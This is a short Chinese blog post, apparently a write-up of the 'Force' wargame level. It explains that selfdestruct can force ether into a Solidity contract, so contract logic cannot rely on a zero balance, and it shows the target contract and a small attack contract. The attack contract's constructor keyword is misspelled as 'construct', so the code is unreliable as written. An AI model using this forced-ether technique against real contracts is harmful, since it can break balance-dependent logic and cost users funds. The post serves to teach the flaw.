---
title: 合约攻击-Force
date: 2025-08-14 14:28:16
tags: solidity
categories: Web3
---

在 solidity 中，如果一个合约想要接收 ether，fallback 必须设置为 payable

但是并没有什么办法可以组织攻击者通过自毁的方法向合约发送 ether，所以不要将任何合约逻辑基于 `address(this).balance == 0` 之上<!-- more -->

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force { /*
                   MEOW ?
         /\_/\   /
    ____/ o o \
    /~____  =ø= /
    (______)__m_m)
                   */ }
```

```solidity
// 攻击合约

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ForceAttack {
  construct(address payable target) payable {
    require(msg.value > 0, "You need to send some ether to attack!");
    selfdestruct(target);
  }
}

```
